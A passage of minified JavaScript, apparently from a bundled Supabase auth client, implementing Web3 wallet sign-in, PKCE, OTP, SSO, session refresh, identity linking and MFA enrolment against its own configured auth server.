w,E;if("message"in r)w=r.message,E=r.signature;else{const{chain:T,wallet:D,statement:z,options:I}=r;let H;if(bt())if(typeof D=="object")H=D;else{const J=window;if("solana"in J&&typeof J.solana=="object"&&("signIn"in J.solana&&typeof J.solana.signIn=="function"||"signMessage"in J.solana&&typeof J.solana.signMessage=="function"))H=J.solana;else throw new Error("@supabase/auth-js: No compatible Solana wallet interface on the window object (window.solana) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'solana', wallet: resolvedUserWallet }) instead.")}else{if(typeof D!="object"||!I?.url)throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");H=D}const te=new URL((n=I?.url)!==null&&n!==void 0?n:window.location.href);if("signIn"in H&&H.signIn){const J=await H.signIn(Object.assign(Object.assign(Object.assign({issuedAt:new Date().toISOString()},I?.signInWithSolana),{version:"1",domain:te.host,uri:te.href}),z?{statement:z}:null));let F;if(Array.isArray(J)&&J[0]&&typeof J[0]=="object")F=J[0];else if(J&&typeof J=="object"&&"signedMessage"in J&&"signature"in J)F=J;else throw new Error("@supabase/auth-js: Wallet method signIn() returned unrecognized value");if("signedMessage"in F&&"signature"in F&&(typeof F.signedMessage=="string"||F.signedMessage instanceof Uint8Array)&&F.signature instanceof Uint8Array)w=typeof F.signedMessage=="string"?F.signedMessage:new TextDecoder().decode(F.signedMessage),E=F.signature;else throw new Error("@supabase/auth-js: Wallet method signIn() API returned object without signedMessage and signature fields")}else{if(!("signMessage"in H)||typeof H.signMessage!="function"||!("publicKey"in H)||typeof H!="object"||!H.publicKey||!("toBase58"in H.publicKey)||typeof H.publicKey.toBase58!="function")throw new Error("@supabase/auth-js: Wallet does not have a compatible signMessage() and publicKey.toBase58() API");w=[`${te.host} wants you to sign in with your Solana account:`,H.publicKey.toBase58(),...z?["",z,""]:[""],"Version: 1",`URI: ${te.href}`,`Issued At: ${(c=(l=I?.signInWithSolana)===null||l===void 0?void 0:l.issuedAt)!==null&&c!==void 0?c:new Date().toISOString()}`,...!((u=I?.signInWithSolana)===null||u===void 0)&&u.notBefore?[`Not Before: ${I.signInWithSolana.notBefore}`]:[],...!((h=I?.signInWithSolana)===null||h===void 0)&&h.expirationTime?[`Expiration Time: ${I.signInWithSolana.expirationTime}`]:[],...!((m=I?.signInWithSolana)===null||m===void 0)&&m.chainId?[`Chain ID: ${I.signInWithSolana.chainId}`]:[],...!((x=I?.signInWithSolana)===null||x===void 0)&&x.nonce?[`Nonce: ${I.signInWithSolana.nonce}`]:[],...!((y=I?.signInWithSolana)===null||y===void 0)&&y.requestId?[`Request ID: ${I.signInWithSolana.requestId}`]:[],...!((k=(v=I?.signInWithSolana)===null||v===void 0?void 0:v.resources)===null||k===void 0)&&k.length?["Resources",...I.signInWithSolana.resources.map(F=>`- ${F}`)]:[]].join(`
`);const J=await H.signMessage(new TextEncoder().encode(w),"utf8");if(!J||!(J instanceof Uint8Array))throw new Error("@supabase/auth-js: Wallet signMessage() API returned an recognized value");E=J}}try{const{data:T,error:D}=await ye(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"solana",message:w,signature:nn(E)},!((_=r.options)===null||_===void 0)&&_.captchaToken?{gotrue_meta_security:{captcha_token:(S=r.options)===null||S===void 0?void 0:S.captchaToken}}:null),xform:kr});if(D)throw D;if(!T||!T.session||!T.user){const z=new In;return this._returnResult({data:{user:null,session:null},error:z})}return T.session&&(await this._saveSession(T.session),await this._notifyAllSubscribers("SIGNED_IN",T.session)),this._returnResult({data:Object.assign({},T),error:D})}catch(T){if(ce(T))return this._returnResult({data:{user:null,session:null},error:T});throw T}}async _exchangeCodeForSession(r){const n=await en(this.storage,`${this.storageKey}-code-verifier`),[l,c]=(n??"").split("/");try{if(!l&&this.flowType==="pkce")throw new Sg;const{data:u,error:h}=await ye(this.fetch,"POST",`${this.url}/token?grant_type=pkce`,{headers:this.headers,body:{auth_code:r,code_verifier:l},xform:kr});if(await wt(this.storage,`${this.storageKey}-code-verifier`),h)throw h;if(!u||!u.session||!u.user){const m=new In;return this._returnResult({data:{user:null,session:null,redirectType:null},error:m})}return u.session&&(await this._saveSession(u.session),await this._notifyAllSubscribers("SIGNED_IN",u.session)),this._returnResult({data:Object.assign(Object.assign({},u),{redirectType:c??null}),error:h})}catch(u){if(await wt(this.storage,`${this.storageKey}-code-verifier`),ce(u))return this._returnResult({data:{user:null,session:null,redirectType:null},error:u});throw u}}async signInWithIdToken(r){try{const{options:n,provider:l,token:c,access_token:u,nonce:h}=r,m=await ye(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,body:{provider:l,id_token:c,access_token:u,nonce:h,gotrue_meta_security:{captcha_token:n?.captchaToken}},xform:kr}),{data:x,error:y}=m;if(y)return this._returnResult({data:{user:null,session:null},error:y});if(!x||!x.session||!x.user){const v=new In;return this._returnResult({data:{user:null,session:null},error:v})}return x.session&&(await this._saveSession(x.session),await this._notifyAllSubscribers("SIGNED_IN",x.session)),this._returnResult({data:x,error:y})}catch(n){if(ce(n))return this._returnResult({data:{user:null,session:null},error:n});throw n}}async signInWithOtp(r){var n,l,c,u,h;try{if("email"in r){const{email:m,options:x}=r;let y=null,v=null;this.flowType==="pkce"&&([y,v]=await $n(this.storage,this.storageKey));const{error:k}=await ye(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{email:m,data:(n=x?.data)!==null&&n!==void 0?n:{},create_user:(l=x?.shouldCreateUser)!==null&&l!==void 0?l:!0,gotrue_meta_security:{captcha_token:x?.captchaToken},code_challenge:y,code_challenge_method:v},redirectTo:x?.emailRedirectTo});return this._returnResult({data:{user:null,session:null},error:k})}if("phone"in r){const{phone:m,options:x}=r,{data:y,error:v}=await ye(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{phone:m,data:(c=x?.data)!==null&&c!==void 0?c:{},create_user:(u=x?.shouldCreateUser)!==null&&u!==void 0?u:!0,gotrue_meta_security:{captcha_token:x?.captchaToken},channel:(h=x?.channel)!==null&&h!==void 0?h:"sms"}});return this._returnResult({data:{user:null,session:null,messageId:y?.message_id},error:v})}throw new rl("You must provide either an email or phone number.")}catch(m){if(await wt(this.storage,`${this.storageKey}-code-verifier`),ce(m))return this._returnResult({data:{user:null,session:null},error:m});throw m}}async verifyOtp(r){var n,l;try{let c,u;"options"in r&&(c=(n=r.options)===null||n===void 0?void 0:n.redirectTo,u=(l=r.options)===null||l===void 0?void 0:l.captchaToken);const{data:h,error:m}=await ye(this.fetch,"POST",`${this.url}/verify`,{headers:this.headers,body:Object.assign(Object.assign({},r),{gotrue_meta_security:{captcha_token:u}}),redirectTo:c,xform:kr});if(m)throw m;if(!h)throw new Error("An error occurred on token verification.");const x=h.session,y=h.user;return x?.access_token&&(await this._saveSession(x),await this._notifyAllSubscribers(r.type=="recovery"?"PASSWORD_RECOVERY":"SIGNED_IN",x)),this._returnResult({data:{user:y,session:x},error:null})}catch(c){if(ce(c))return this._returnResult({data:{user:null,session:null},error:c});throw c}}async signInWithSSO(r){var n,l,c,u,h;try{let m=null,x=null;this.flowType==="pkce"&&([m,x]=await $n(this.storage,this.storageKey));const y=await ye(this.fetch,"POST",`${this.url}/sso`,{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in r?{provider_id:r.providerId}:null),"domain"in r?{domain:r.domain}:null),{redirect_to:(l=(n=r.options)===null||n===void 0?void 0:n.redirectTo)!==null&&l!==void 0?l:void 0}),!((c=r?.options)===null||c===void 0)&&c.captchaToken?{gotrue_meta_security:{captcha_token:r.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:m,code_challenge_method:x}),headers:this.headers,xform:Qg});return!((u=y.data)===null||u===void 0)&&u.url&&bt()&&!(!((h=r.options)===null||h===void 0)&&h.skipBrowserRedirect)&&window.location.assign(y.data.url),this._returnResult(y)}catch(m){if(await wt(this.storage,`${this.storageKey}-code-verifier`),ce(m))return this._returnResult({data:null,error:m});throw m}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async r=>{const{data:{session:n},error:l}=r;if(l)throw l;if(!n)throw new Yt;const{error:c}=await ye(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:n.access_token});return this._returnResult({data:{user:null,session:null},error:c})})}catch(r){if(ce(r))return this._returnResult({data:{user:null,session:null},error:r});throw r}}async resend(r){try{const n=`${this.url}/resend`;if("email"in r){const{email:l,type:c,options:u}=r,{error:h}=await ye(this.fetch,"POST",n,{headers:this.headers,body:{email:l,type:c,gotrue_meta_security:{captcha_token:u?.captchaToken}},redirectTo:u?.emailRedirectTo});return this._returnResult({data:{user:null,session:null},error:h})}else if("phone"in r){const{phone:l,type:c,options:u}=r,{data:h,error:m}=await ye(this.fetch,"POST",n,{headers:this.headers,body:{phone:l,type:c,gotrue_meta_security:{captcha_token:u?.captchaToken}}});return this._returnResult({data:{user:null,session:null,messageId:h?.message_id},error:m})}throw new rl("You must provide either an email or phone number and a type")}catch(n){if(ce(n))return this._returnResult({data:{user:null,session:null},error:n});throw n}}async getSession(){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>this._useSession(async n=>n))}async _acquireLock(r,n){this._debug("#_acquireLock","begin",r);try{if(this.lockAcquired){const l=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),c=(async()=>(await l,await n()))();return this.pendingInLock.push((async()=>{try{await c}catch{}})()),c}return await this.lock(`lock:${this.storageKey}`,r,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const l=n();for(this.pendingInLock.push((async()=>{try{await l}catch{}})()),await l;this.pendingInLock.length;){const c=[...this.pendingInLock];await Promise.all(c),this.pendingInLock.splice(0,c.length)}return await l}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(r){this._debug("#_useSession","begin");try{const n=await this.__loadSession();return await r(n)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",new Error().stack);try{let r=null;const n=await en(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",n),n!==null&&(this._isValidSession(n)?r=n:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!r)return{data:{session:null},error:null};const l=r.expires_at?r.expires_at*1e3-Date.now()<xc:!1;if(this._debug("#__loadSession()",`session has${l?"":" not"} expired`,"expires_at",r.expires_at),!l){if(this.userStorage){const h=await en(this.userStorage,this.storageKey+"-user");h?.user?r.user=h.user:r.user=vc()}if(this.storage.isServer&&r.user&&!r.user.__isUserNotAvailableProxy){const h={value:this.suppressGetSessionWarning};r.user=Kg(r.user,h),h.value&&(this.suppressGetSessionWarning=!0)}return{data:{session:r},error:null}}const{data:c,error:u}=await this._callRefreshToken(r.refresh_token);return u?this._returnResult({data:{session:null},error:u}):this._returnResult({data:{session:c},error:null})}finally{this._debug("#__loadSession()","end")}}async getUser(r){if(r)return await this._getUser(r);await this.initializePromise;const n=await this._acquireLock(this.lockAcquireTimeout,async()=>await this._getUser());return n.data.user&&(this.suppressGetSessionWarning=!0),n}async _getUser(r){try{return r?await ye(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:r,xform:Ps}):await this._useSession(async n=>{var l,c,u;const{data:h,error:m}=n;if(m)throw m;return!(!((l=h.session)===null||l===void 0)&&l.access_token)&&!this.hasCustomAuthorizationHeader?{data:{user:null},error:new Yt}:await ye(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:(u=(c=h.session)===null||c===void 0?void 0:c.access_token)!==null&&u!==void 0?u:void 0,xform:Ps})})}catch(n){if(ce(n))return _g(n)&&(await this._removeSession(),await wt(this.storage,`${this.storageKey}-code-verifier`)),this._returnResult({data:{user:null},error:n});throw n}}async updateUser(r,n={}){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._updateUser(r,n))}async _updateUser(r,n={}){try{return await this._useSession(async l=>{const{data:c,error:u}=l;if(u)throw u;if(!c.session)throw new Yt;const h=c.session;let m=null,x=null;this.flowType==="pkce"&&r.email!=null&&([m,x]=await $n(this.storage,this.storageKey));const{data:y,error:v}=await ye(this.fetch,"PUT",`${this.url}/user`,{headers:this.headers,redirectTo:n?.emailRedirectTo,body:Object.assign(Object.assign({},r),{code_challenge:m,code_challenge_method:x}),jwt:h.access_token,xform:Ps});if(v)throw v;return h.user=y.user,await this._saveSession(h),await this._notifyAllSubscribers("USER_UPDATED",h),this._returnResult({data:{user:h.user},error:null})})}catch(l){if(await wt(this.storage,`${this.storageKey}-code-verifier`),ce(l))return this._returnResult({data:{user:null},error:l});throw l}}async setSession(r){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._setSession(r))}async _setSession(r){try{if(!r.access_token||!r.refresh_token)throw new Yt;const n=Date.now()/1e3;let l=n,c=!0,u=null;const{payload:h}=yc(r.access_token);if(h.exp&&(l=h.exp,c=l<=n),c){const{data:m,error:x}=await this._callRefreshToken(r.refresh_token);if(x)return this._returnResult({data:{user:null,session:null},error:x});if(!m)return{data:{user:null,session:null},error:null};u=m}else{const{data:m,error:x}=await this._getUser(r.access_token);if(x)throw x;u={access_token:r.access_token,refresh_token:r.refresh_token,user:m.user,token_type:"bearer",expires_in:l-n,expires_at:l},await this._saveSession(u),await this._notifyAllSubscribers("SIGNED_IN",u)}return this._returnResult({data:{user:u.user,session:u},error:null})}catch(n){if(ce(n))return this._returnResult({data:{session:null,user:null},error:n});throw n}}async refreshSession(r){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._refreshSession(r))}async _refreshSession(r){try{return await this._useSession(async n=>{var l;if(!r){const{data:h,error:m}=n;if(m)throw m;r=(l=h.session)!==null&&l!==void 0?l:void 0}if(!r?.refresh_token)throw new Yt;const{data:c,error:u}=await this._callRefreshToken(r.refresh_token);return u?this._returnResult({data:{user:null,session:null},error:u}):c?this._returnResult({data:{user:c.user,session:c},error:null}):this._returnResult({data:{user:null,session:null},error:null})})}catch(n){if(ce(n))return this._returnResult({data:{user:null,session:null},error:n});throw n}}async _getSessionFromURL(r,n){try{if(!bt())throw new sl("No browser detected.");if(r.error||r.error_description||r.error_code)throw new sl(r.error_description||"Error in URL with unspecified error_description",{error:r.error||"unspecified_error",code:r.error_code||"unspecified_code"});switch(n){case"implicit":if(this.flowType==="pkce")throw new ef("Not a valid PKCE flow url.");break;case"pkce":if(this.flowType==="implicit")throw new sl("Not a valid implicit grant flow url.");break;default:}if(n==="pkce"){if(this._debug("#_initialize()","begin","is PKCE flow",!0),!r.code)throw new ef("No code detected.");const{data:z,error:I}=await this._exchangeCodeForSession(r.code);if(I)throw I;const H=new URL(window.location.href);return H.searchParams.delete("code"),window.history.replaceState(window.history.state,"",H.toString()),{data:{session:z.session,redirectType:null},error:null}}const{provider_token:l,provider_refresh_token:c,access_token:u,refresh_token:h,expires_in:m,expires_at:x,token_type:y}=r;if(!u||!m||!h||!y)throw new sl("No session defined in URL");const v=Math.round(Date.now()/1e3),k=parseInt(m);let _=v+k;x&&(_=parseInt(x));const S=_-v;S*1e3<=Mn&&console.warn(`@supabase/gotrue-js: Session as retrieved from URL expires in ${S}s, should have been closer to ${k}s`);const w=_-k;v-w>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",w,_,v):v-w<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clock for skew",w,_,v);const{data:E,error:T}=await this._getUser(u);if(T)throw T;const D={provider_token:l,provider_refresh_token:c,access_token:u,expires_in:k,expires_at:_,refresh_token:h,token_type:y,user:E.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),this._returnResult({data:{session:D,redirectType:r.type},error:null})}catch(l){if(ce(l))return this._returnResult({data:{session:null,redirectType:null},error:l});throw l}}_isImplicitGrantCallback(r){return typeof this.detectSessionInUrl=="function"?this.detectSessionInUrl(new URL(window.location.href),r):!!(r.access_token||r.error_description)}async _isPKCECallback(r){const n=await en(this.storage,`${this.storageKey}-code-verifier`);return!!(r.code&&n)}async signOut(r={scope:"global"}){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._signOut(r))}async _signOut({scope:r}={scope:"global"}){return await this._useSession(async n=>{var l;const{data:c,error:u}=n;if(u)return this._returnResult({error:u});const h=(l=c.session)===null||l===void 0?void 0:l.access_token;if(h){const{error:m}=await this.admin.signOut(h,r);if(m&&!(kg(m)&&(m.status===404||m.status===401||m.status===403)))return this._returnResult({error:m})}return r!=="others"&&(await this._removeSession(),await wt(this.storage,`${this.storageKey}-code-verifier`)),this._returnResult({error:null})})}onAuthStateChange(r){const n=Og(),l={id:n,callback:r,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",n),this.stateChangeEmitters.delete(n)}};return this._debug("#onAuthStateChange()","registered callback with id",n),this.stateChangeEmitters.set(n,l),(async()=>(await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>{this._emitInitialSession(n)})))(),{data:{subscription:l}}}async _emitInitialSession(r){return await this._useSession(async n=>{var l,c;try{const{data:{session:u},error:h}=n;if(h)throw h;await((l=this.stateChangeEmitters.get(r))===null||l===void 0?void 0:l.callback("INITIAL_SESSION",u)),this._debug("INITIAL_SESSION","callback id",r,"session",u)}catch(u){await((c=this.stateChangeEmitters.get(r))===null||c===void 0?void 0:c.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",r,"error",u),console.error(u)}})}async resetPasswordForEmail(r,n={}){let l=null,c=null;this.flowType==="pkce"&&([l,c]=await $n(this.storage,this.storageKey,!0));try{return await ye(this.fetch,"POST",`${this.url}/recover`,{body:{email:r,code_challenge:l,code_challenge_method:c,gotrue_meta_security:{captcha_token:n.captchaToken}},headers:this.headers,redirectTo:n.redirectTo})}catch(u){if(await wt(this.storage,`${this.storageKey}-code-verifier`),ce(u))return this._returnResult({data:null,error:u});throw u}}async getUserIdentities(){var r;try{const{data:n,error:l}=await this.getUser();if(l)throw l;return this._returnResult({data:{identities:(r=n.user.identities)!==null&&r!==void 0?r:[]},error:null})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}}async linkIdentity(r){return"token"in r?this.linkIdentityIdToken(r):this.linkIdentityOAuth(r)}async linkIdentityOAuth(r){var n;try{const{data:l,error:c}=await this._useSession(async u=>{var h,m,x,y,v;const{data:k,error:_}=u;if(_)throw _;const S=await this._getUrlForProvider(`${this.url}/user/identities/authorize`,r.provider,{redirectTo:(h=r.options)===null||h===void 0?void 0:h.redirectTo,scopes:(m=r.options)===null||m===void 0?void 0:m.scopes,queryParams:(x=r.options)===null||x===void 0?void 0:x.queryParams,skipBrowserRedirect:!0});return await ye(this.fetch,"GET",S,{headers:this.headers,jwt:(v=(y=k.session)===null||y===void 0?void 0:y.access_token)!==null&&v!==void 0?v:void 0})});if(c)throw c;return bt()&&!(!((n=r.options)===null||n===void 0)&&n.skipBrowserRedirect)&&window.location.assign(l?.url),this._returnResult({data:{provider:r.provider,url:l?.url},error:null})}catch(l){if(ce(l))return this._returnResult({data:{provider:r.provider,url:null},error:l});throw l}}async linkIdentityIdToken(r){return await this._useSession(async n=>{var l;try{const{error:c,data:{session:u}}=n;if(c)throw c;const{options:h,provider:m,token:x,access_token:y,nonce:v}=r,k=await ye(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,jwt:(l=u?.access_token)!==null&&l!==void 0?l:void 0,body:{provider:m,id_token:x,access_token:y,nonce:v,link_identity:!0,gotrue_meta_security:{captcha_token:h?.captchaToken}},xform:kr}),{data:_,error:S}=k;return S?this._returnResult({data:{user:null,session:null},error:S}):!_||!_.session||!_.user?this._returnResult({data:{user:null,session:null},error:new In}):(_.session&&(await this._saveSession(_.session),await this._notifyAllSubscribers("USER_UPDATED",_.session)),this._returnResult({data:_,error:S}))}catch(c){if(await wt(this.storage,`${this.storageKey}-code-verifier`),ce(c))return this._returnResult({data:{user:null,session:null},error:c});throw c}})}async unlinkIdentity(r){try{return await this._useSession(async n=>{var l,c;const{data:u,error:h}=n;if(h)throw h;return await ye(this.fetch,"DELETE",`${this.url}/user/identities/${r.identity_id}`,{headers:this.headers,jwt:(c=(l=u.session)===null||l===void 0?void 0:l.access_token)!==null&&c!==void 0?c:void 0})})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}}async _refreshAccessToken(r){const n=`#_refreshAccessToken(${r.substring(0,5)}...)`;this._debug(n,"begin");try{const l=Date.now();return await zg(async c=>(c>0&&await Dg(200*Math.pow(2,c-1)),this._debug(n,"refreshing attempt",c),await ye(this.fetch,"POST",`${this.url}/token?grant_type=refresh_token`,{body:{refresh_token:r},headers:this.headers,xform:kr})),(c,u)=>{const h=200*Math.pow(2,c);return u&&gc(u)&&Date.now()+h-l<Mn})}catch(l){if(this._debug(n,"error",l),ce(l))return this._returnResult({data:{session:null,user:null},error:l});throw l}finally{this._debug(n,"end")}}_isValidSession(r){return typeof r=="object"&&r!==null&&"access_token"in r&&"refresh_token"in r&&"expires_at"in r}async _handleProviderSignIn(r,n){const l=await this._getUrlForProvider(`${this.url}/authorize`,r,{redirectTo:n.redirectTo,scopes:n.scopes,queryParams:n.queryParams});return this._debug("#_handleProviderSignIn()","provider",r,"options",n,"url",l),bt()&&!n.skipBrowserRedirect&&window.location.assign(l),{data:{provider:r,url:l},error:null}}async _recoverAndRefresh(){var r,n;const l="#_recoverAndRefresh()";this._debug(l,"begin");try{const c=await en(this.storage,this.storageKey);if(c&&this.userStorage){let h=await en(this.userStorage,this.storageKey+"-user");!this.storage.isServer&&Object.is(this.storage,this.userStorage)&&!h&&(h={user:c.user},await Fn(this.userStorage,this.storageKey+"-user",h)),c.user=(r=h?.user)!==null&&r!==void 0?r:vc()}else if(c&&!c.user&&!c.user){const h=await en(this.storage,this.storageKey+"-user");h&&h?.user?(c.user=h.user,await wt(this.storage,this.storageKey+"-user"),await Fn(this.storage,this.storageKey,c)):c.user=vc()}if(this._debug(l,"session from storage",c),!this._isValidSession(c)){this._debug(l,"session is not valid"),c!==null&&await this._removeSession();return}const u=((n=c.expires_at)!==null&&n!==void 0?n:1/0)*1e3-Date.now()<xc;if(this._debug(l,`session has${u?"":" not"} expired with margin of ${xc}s`),u){if(this.autoRefreshToken&&c.refresh_token){const{error:h}=await this._callRefreshToken(c.refresh_token);h&&(console.error(h),gc(h)||(this._debug(l,"refresh failed with a non-retryable error, removing the session",h),await this._removeSession()))}}else if(c.user&&c.user.__isUserNotAvailableProxy===!0)try{const{data:h,error:m}=await this._getUser(c.access_token);!m&&h?.user?(c.user=h.user,await this._saveSession(c),await this._notifyAllSubscribers("SIGNED_IN",c)):this._debug(l,"could not get user data, skipping SIGNED_IN notification")}catch(h){console.error("Error getting user data:",h),this._debug(l,"error getting user data, skipping SIGNED_IN notification",h)}else await this._notifyAllSubscribers("SIGNED_IN",c)}catch(c){this._debug(l,"error",c),console.error(c);return}finally{this._debug(l,"end")}}async _callRefreshToken(r){var n,l;if(!r)throw new Yt;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const c=`#_callRefreshToken(${r.substring(0,5)}...)`;this._debug(c,"begin");try{this.refreshingDeferred=new Nl;const{data:u,error:h}=await this._refreshAccessToken(r);if(h)throw h;if(!u.session)throw new Yt;await this._saveSession(u.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",u.session);const m={data:u.session,error:null};return this.refreshingDeferred.resolve(m),m}catch(u){if(this._debug(c,"error",u),ce(u)){const h={data:null,error:u};return gc(u)||await this._removeSession(),(n=this.refreshingDeferred)===null||n===void 0||n.resolve(h),h}throw(l=this.refreshingDeferred)===null||l===void 0||l.reject(u),u}finally{this.refreshingDeferred=null,this._debug(c,"end")}}async _notifyAllSubscribers(r,n,l=!0){const c=`#_notifyAllSubscribers(${r})`;this._debug(c,"begin",n,`broadcast = ${l}`);try{this.broadcastChannel&&l&&this.broadcastChannel.postMessage({event:r,session:n});const u=[],h=Array.from(this.stateChangeEmitters.values()).map(async m=>{try{await m.callback(r,n)}catch(x){u.push(x)}});if(await Promise.all(h),u.length>0){for(let m=0;m<u.length;m+=1)console.error(u[m]);throw u[0]}}finally{this._debug(c,"end")}}async _saveSession(r){this._debug("#_saveSession()",r),this.suppressGetSessionWarning=!0,await wt(this.storage,`${this.storageKey}-code-verifier`);const n=Object.assign({},r),l=n.user&&n.user.__isUserNotAvailableProxy===!0;if(this.userStorage){!l&&n.user&&await Fn(this.userStorage,this.storageKey+"-user",{user:n.user});const c=Object.assign({},n);delete c.user;const u=af(c);await Fn(this.storage,this.storageKey,u)}else{const c=af(n);await Fn(this.storage,this.storageKey,c)}}async _removeSession(){this._debug("#_removeSession()"),this.suppressGetSessionWarning=!1,await wt(this.storage,this.storageKey),await wt(this.storage,this.storageKey+"-code-verifier"),await wt(this.storage,this.storageKey+"-user"),this.userStorage&&await wt(this.userStorage,this.storageKey+"-user"),await this._notifyAllSubscribers("SIGNED_OUT",null)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const r=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{r&&bt()&&window?.removeEventListener&&window.removeEventListener("visibilitychange",r)}catch(n){console.error("removing visibilitychange callback failed",n)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const r=setInterval(()=>this._autoRefreshTokenTick(),Mn);this.autoRefreshTicker=r,r&&typeof r=="object"&&typeof r.unref=="function"?r.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(r);const n=setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0);this.autoRefreshTickTimeout=n,n&&typeof n=="object"&&typeof n.unref=="function"?n.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(n)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const r=this.autoRefreshTicker;this.autoRefreshTicker=null,r&&clearInterval(r);const n=this.autoRefreshTickTimeout;this.autoRefreshTickTimeout=null,n&&clearTimeout(n)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const r=Date.now();try{return await this._useSession(async n=>{const{data:{session:l}}=n;if(!l||!l.refresh_token||!l.expires_at){this._debug("#_autoRefreshTokenTick()","no session");return}const c=Math.floor((l.expires_at*1e3-r)/Mn);this._debug("#_autoRefreshTokenTick()",`access token expires in ${c} ticks, a tick lasts ${Mn}ms, refresh threshold is ${Ic} ticks`),c<=Ic&&await this._callRefreshToken(l.refresh_token)})}catch(n){console.error("Auto refresh tick failed with error. This is likely a transient error.",n)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(r){if(r.isAcquireTimeout||r instanceof Hf)this._debug("auto refresh token tick lock not available");else throw r}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!bt()||!window?.addEventListener)return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>await this._onVisibilityChanged(!1),window?.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(r){console.error("_handleVisibilityChange",r)}}async _onVisibilityChanged(r){const n=`#_onVisibilityChanged(${r})`;this._debug(n,"visibilityState",document.visibilityState),document.visibilityState==="visible"?(this.autoRefreshToken&&this._startAutoRefresh(),r||(await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>{if(document.visibilityState!=="visible"){this._debug(n,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting");return}await this._recoverAndRefresh()}))):document.visibilityState==="hidden"&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(r,n,l){const c=[`provider=${encodeURIComponent(n)}`];if(l?.redirectTo&&c.push(`redirect_to=${encodeURIComponent(l.redirectTo)}`),l?.scopes&&c.push(`scopes=${encodeURIComponent(l.scopes)}`),this.flowType==="pkce"){const[u,h]=await $n(this.storage,this.storageKey),m=new URLSearchParams({code_challenge:`${encodeURIComponent(u)}`,code_challenge_method:`${encodeURIComponent(h)}`});c.push(m.toString())}if(l?.queryParams){const u=new URLSearchParams(l.queryParams);c.push(u.toString())}return l?.skipBrowserRedirect&&c.push(`skip_http_redirect=${l.skipBrowserRedirect}`),`${r}?${c.join("&")}`}async _unenroll(r){try{return await this._useSession(async n=>{var l;const{data:c,error:u}=n;return u?this._returnResult({data:null,error:u}):await ye(this.fetch,"DELETE",`${this.url}/factors/${r.factorId}`,{headers:this.headers,jwt:(l=c?.session)===null||l===void 0?void 0:l.access_token})})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}}async _enroll(r){try{return await this._useSession(async n=>{var l,c;const{data:u,error:h}=n;if(h)return this._returnResult({data:null,error:h});const m=Object.assign({friendly_name:r.friendlyName,factor_type:r.factorType},r.factorType==="phone"?{phone:r.phone}:r.factorType==="totp"?{issuer:r.issuer}:{}),{data:x,error:y}=await ye(this.fetch,"POST",`${this.url}/factors`,{body:m,headers:this.headers,jwt:(l=u?.session)===null||l===void 0?void 0:l.access_token});return y?this._returnResult({data:null,error:y}):(r.factorType==="totp"&&x.type==="totp"&&(!((c=x?.totp)===null||c===void 